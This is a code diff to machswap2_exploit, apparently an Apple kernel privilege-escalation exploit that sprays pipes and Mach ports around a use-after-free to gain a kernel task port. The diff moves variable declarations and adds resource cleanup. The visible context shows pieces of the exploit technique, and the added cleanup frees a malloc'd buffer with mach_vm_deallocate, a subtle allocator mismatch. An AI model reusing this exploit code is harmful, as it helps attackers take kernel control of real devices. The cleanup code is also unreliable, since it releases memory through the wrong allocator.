@@ -668,6 +668,9 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
 
     kport_t *fakeport = NULL;
     mach_port_t the_one = MACH_PORT_NULL;
+    void *pipebuf = NULL;
+    int *pipefds = NULL;
+    int total_pipes = 0;
     
     /********** ********** data hunting ********** **********/
 
@@ -805,9 +808,9 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
         goto out;
     }
 
-    int total_pipes = 0x500;
+    total_pipes = 0x500;
     size_t total_pipes_size = total_pipes * 2 * sizeof(int);
-    int *pipefds = malloc(total_pipes_size);
+    pipefds = malloc(total_pipes_size);
     bzero(pipefds, total_pipes_size);
 
     for (size_t i = 0; i < total_pipes; i++) 
@@ -837,7 +840,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
 
     LOG("total pipes created: %d",total_pipes);
 
-    void *pipebuf = malloc(pagesize);
+    pipebuf = malloc(pagesize);
     bzero(pipebuf, pagesize);
 
     /* create a few vouchers used to trigger the bug */
@@ -905,7 +908,7 @@ kern_return_t machswap2_exploit(machswap_offsets_t *offsets, task_t *tfp0_back, 
         mach_port_destroy(mach_task_self(), before[i]);
     }
     
-    /* 
+    /*
         hopefully the page which contained our uaf port is now completely
         free of allocations, and we can trigger gc to release the page to 
         allow for reallocation into another kalloc zone
@@ -1610,6 +1613,20 @@ out:;
     if (the_one)
     {
         mach_port_destroy(mach_task_self(), the_one);
+    }
+    
+    for (size_t i = 0; i < 2 * total_pipes; i++) {
+        if (pipefds[i] != -1){
+            close(pipefds[i]);
+        }
+    }
+    
+    if (pipebuf) {
+        mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pipebuf, pagesize);
+    }
+    
+    if (pipefds) {
+        free((void *)pipefds);
     }
 
     return ret;
